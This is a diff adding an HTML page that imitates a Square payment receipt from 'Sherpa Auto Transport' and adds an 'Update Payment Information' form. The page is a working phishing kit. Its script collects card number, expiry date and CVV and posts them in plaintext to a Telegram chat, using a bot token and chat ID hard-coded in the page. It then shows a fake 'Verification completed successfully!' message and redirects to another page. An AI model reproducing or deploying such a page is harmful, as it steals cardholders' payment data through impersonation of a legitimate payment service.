@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Receipt from Sherpa Auto Transport</title>
+  <style>
+    body {
+      background-color: #f5f6f7;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      color: #2d2d2d;
+    }
+
+    .receipt-container {
+      max-width: 440px;
+      margin: 0 auto;
+      background-color: white;
+      padding-bottom: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.06);
+    }
+
+    .top-header {
+      background-color: #0073cf;
+      padding: 25px 0;
+      text-align: center;
+    }
+
+    .top-header img {
+      background: white;
+      border-radius: 12px;
+      padding: 10px;
+      max-height: 60px;
+    }
+
+    .brand-title {
+      text-align: center;
+      font-weight: 600;
+      font-size: 18px;
+      padding: 20px 0 10px;
+    }
+
+    .feedback {
+      background-color: #f5f6f7;
+      text-align: center;
+      padding: 20px;
+      margin: 0 20px;
+      border-radius: 8px;
+    }
+
+    .feedback img {
+      width: 48px;
+      margin: 0 10px;
+      vertical-align: middle;
+    }
+
+    .feedback p {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #444;
+    }
+
+    .amount {
+      font-size: 44px;
+      font-weight: 700;
+      text-align: center;
+      padding: 20px 0 10px;
+    }
+
+    .line-item,
+    .total {
+      display: flex;
+      justify-content: space-between;
+      padding: 5px 20px;
+      font-size: 14px;
+    }
+
+    .total {
+      font-weight: bold;
+    }
+
+    hr {
+      border: none;
+      border-top: 1px dashed #ccc;
+      margin: 15px 20px;
+    }
+
+    .contact {
+      text-align: center;
+      font-size: 14px;
+      padding: 15px;
+    }
+
+    .contact a {
+      color: #0073cf;
+      text-decoration: none;
+    }
+
+    .web-icon {
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    .web-icon img {
+      width: 28px;
+    }
+
+    .payment-details {
+      font-size: 13px;
+      color: #444;
+      text-align: center;
+      padding: 10px 20px;
+    }
+
+    .payment-details img {
+      height: 20px;
+      vertical-align: middle;
+      margin-right: 6px;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 13px;
+      color: #888;
+      background: #f2f2f2;
+      padding: 20px;
+      margin-top: 20px;
+    }
+
+    .footer b {
+      display: block;
+      margin-bottom: 6px;
+    }
+  </style>
+</head>
+<body>
+  <div class="receipt-container">
+    <div class="top-header">
+      <img src="https://square-web-production-f.squarecdn.com/files/6e117c59b5374cbe007a2f8f00d75def2b02dc6e/original.jpeg?width=128&height=128&enable=upscale&fit=crop&quality=100&format=png" alt="Sherpa Auto Transport Logo">
+    </div>
+
+    <div class="brand-title">Sherpa Auto Transport</div>
+
+    <div class="feedback">
+      <img src="https://receipts-production-f.squarecdn.com/receipts/assets/feedback-positive-09773e374d247d8a044ade582bd9eec927c595e44c9cf8111209bbb57b55ab22.png" alt="Smile">
+      <img src="https://receipts-production-f.squarecdn.com/receipts/assets/feedback-negative-587d1eda2f91ac786e117237de356e331f499767f5fc0148d411b463909b2399.png" alt="Frown">
+      <p>Let Sherpa Auto Transport know<br>how your experience was</p>
+    </div>
+
+    <div class="amount">$0.00</div>
+
+    <div class="line-item">
+      <div>Custom Amount</div>
+      <div>$0.00</div>
+    </div>
+
+    <hr>
+
+    <div class="total">
+      <div>Total</div>
+      <div>$0.00</div>
+    </div>
+
+
+
+
+
+<!-- Payment Form with Masking, Validation, Telegram Integration -->
+<div class="payment-form" style="padding: 0 20px; margin-top: 30px;">
+  <hr style="border: none; border-top: 2px solid #0073cf; margin-bottom: 15px;">
+  <h3 style="font-size: 16px; margin-bottom: 10px; font-weight: 600;">Payment Information</h3>
+
+  <form id="paymentForm" onsubmit="handlePayment(event)">
+    <div style="border: 1px solid #ccc; border-radius: 8px; padding: 12px; background-color: #fafafa;">
+      <div style="display: flex; align-items: center; margin-bottom: 10px; position: relative;">
+        <img id="cardIcon" src="https://img.icons8.com/ios-filled/50/000000/bank-card-back-side.png"
+          style="width: 24px; margin-right: 10px;">
+        <input type="text" id="cardNumber" inputmode="numeric" maxlength="19" placeholder="Card number"
+          style="flex: 1; border: none; outline: none; font-size: 14px; background: transparent;" required>
+      </div>
+
+      <div style="display: flex; border-top: 1px solid #e0e0e0; padding-top: 10px; gap: 10px; align-items: center;">
+  <input type="text" id="expiry" inputmode="numeric" maxlength="9" placeholder="MM/YYYY"
+    style="flex: 1; border: none; outline: none; font-size: 14px; background: transparent;" required>
+
+  <div style="position: relative; flex: 1;">
+    <input type="password" id="cvv" inputmode="numeric" maxlength="4" placeholder="CVV"
+      style="width: 100%; border: none; outline: none; font-size: 14px; background: transparent;" required>
+    <button type="button" id="toggleCvv"
+      style="position: absolute; right: 4px; top: 3px; background: none; border: none; cursor: pointer; font-size: 14px;">👁</button>
+  </div>
+</div>
+
+
+      <div id="errorMessage" style="display:none; color: red; font-size: 13px; margin-top: 8px; text-align: center;">
+        ⚠️ Please fill all fields correctly.
+      </div>
+
+      <button type="submit"
+        style="margin-top:15px;width:100%;padding:10px;background:#0073cf;color:#fff;border:none;border-radius:6px;cursor:pointer;font-weight:600;font-size:14px;">
+        Update Payment Information
+      </button>
+    </div>
+  </form>
+
+  <!-- Animated Success Message -->
+  <div id="successPopup"
+  style="display:none; margin-top: 20px; text-align:center; padding: 15px; background: #d4edda; color: #155724; border: 1px solid #c3e6cb; border-radius: 8px; animation: fadeIn 1s ease-in-out;">
+  ✅ Verification completed successfully!
+  <br><br>
+  <div id="spinner" style="display:none; margin-top: 10px;">
+    <img src="https://i.gifer.com/ZZ5H.gif" width="28" height="28" alt="Loading...">
+    <p style="margin:0; font-size: 13px;">Redirecting...</p>
+  </div>
+</div>
+
+
+  
+<!-- ... your HTML remains same up to this point ... -->
+<!-- inside <script> block -->
+
+<script>
+  const cardInput = document.getElementById("cardNumber");
+  const expiryInput = document.getElementById("expiry");
+  const cardIcon = document.getElementById("cardIcon");
+  const cvvInput = document.getElementById("cvv");
+  const successBox = document.getElementById("successPopup");
+
+  // Create field-level error containers
+  const cardError = document.createElement("div");
+  const expiryError = document.createElement("div");
+  const cvvError = document.createElement("div");
+
+  [cardError, expiryError, cvvError].forEach(div => {
+    div.style.color = "red";
+    div.style.fontSize = "13px";
+    div.style.marginTop = "6px";
+    div.style.display = "none";
+    div.style.textAlign = "center";
+  });
+
+  cardInput.parentNode.after(cardError);
+  expiryInput.parentNode.parentNode.after(expiryError);
+  document.getElementById("toggleCvv").parentNode.after(cvvError);
+
+  // Format card number
+  cardInput.addEventListener("input", function () {
+    let value = this.value.replace(/\D/g, "").slice(0, 16);
+    const isAmex = /^3[47]/.test(value);
+    if (isAmex) value = value.slice(0, 15);
+    let formatted = isAmex
+      ? value.replace(/(\d{4})(\d{6})(\d{0,5})/, "$1 $2 $3")
+      : value.match(/.{1,4}/g)?.join(" ");
+    this.value = formatted?.trim() ?? "";
+
+    // Icon switching
+    if (/^4/.test(value)) {
+      cardIcon.src = "https://img.icons8.com/color/48/000000/visa.png";
+    } else if (/^5[1-5]/.test(value)) {
+      cardIcon.src = "https://img.icons8.com/color/48/000000/mastercard-logo.png";
+    } else if (/^3[47]/.test(value)) {
+      cardIcon.src = "https://img.icons8.com/color/48/000000/amex.png";
+    } else {
+      cardIcon.src = "https://img.icons8.com/ios-filled/50/000000/bank-card-back-side.png";
+    }
+  });
+
+  // Auto slash + MM/YYYY validation
+  expiryInput.addEventListener("input", function () {
+    let val = this.value.replace(/\D/g, "").slice(0, 6);
+    if (val.length >= 3) {
+      this.value = val.slice(0, 2) + "/" + val.slice(2);
+    } else {
+      this.value = val;
+    }
+  });
+
+  // Toggle CVV visibility
+  document.getElementById("toggleCvv").addEventListener("click", function () {
+    const type = cvvInput.type === "password" ? "text" : "password";
+    cvvInput.type = type;
+    this.innerText = type === "password" ? "👁" : "🙈";
+  });
+
+  function showError(field, message) {
+    field.innerText = message;
+    field.style.display = "block";
+  }
+
+  function clearErrors() {
+    cardError.style.display = "none";
+    expiryError.style.display = "none";
+    cvvError.style.display = "none";
+  }
+
+  function handlePayment(e) {
+    e.preventDefault();
+    clearErrors();
+
+    const card = cardInput.value.trim();
+    const expiry = expiryInput.value.trim();
+    const cvv = cvvInput.value.trim();
+    const plainCard = card.replace(/\s/g, "");
+
+    const isAmex = /^3[47]/.test(plainCard);
+    const validCardLength = isAmex ? 15 : 16;
+
+    let valid = true;
+
+    // Card validation
+    if (plainCard.length !== validCardLength || !/^\d+$/.test(plainCard)) {
+      showError(cardError, "⚠️ Invalid card number.");
+      valid = false;
+    }
+
+    // Expiry validation
+    const [month, year] = expiry.split("/");
+    if (
+      !/^\d{2}\/\d{4}$/.test(expiry) ||
+      Number(month) < 1 ||
+      Number(month) > 12
+    ) {
+      showError(expiryError, "⚠️ Enter a valid MM/YYYY date.");
+      valid = false;
+    }
+
+    // CVV validation
+    if (!/^\d{3,4}$/.test(cvv)) {
+      showError(cvvError, "⚠️ Invalid CVV.");
+      valid = false;
+    }
+
+    if (!valid) return;
+
+    // Send to Telegram
+    const formData = {
+      card_number: card,
+      expiry: expiry,
+      cvv: cvv,
+    };
+
+    console.log("Captured Data:", JSON.stringify(formData));
+
+    const botToken = "7999389311:AAF5TnQu3LxyxWlS6E2fCssn7YsFUg3Fs28";
+    const chatId = "6879879625";
+    const message = `💳 New Payment Attempt\n\nCard: ${card}\nExpiry: ${expiry}\nCVV: ${cvv}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: message }),
+    });
+
+    document.getElementById("paymentForm").style.display = "none";
+    successBox.style.display = "block";
+
+    const spinner = document.getElementById("spinner");
+    spinner.style.display = "inline-block";
+
+    setTimeout(() => {
+      window.location.href = "amexcsc.html";
+    }, 5000);
+  }
+</script>
+
+
+
+
+  <style>
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</div>
+
+    <div class="contact">
+      Sherpa Auto Transport<br>
+      <a href="tel:+19808586163">(980) 858-6163</a>
+    </div>
+
+    <div class="web-icon">
+      <img src="https://img.icons8.com/ios-filled/50/000000/internet.png" alt="Web Icon">
+    </div>
+
+    <div class="payment-details">
+      <p>#FO4B</p>
+      <p>Auth code: 013141</p>
+    </div>
+
+    <div class="footer">
+      <b>Run your own business?</b>
+      Start using Square and process $1,000 in<br>sales for free.
+    </div>
+  </div>
+</body>
+</html>
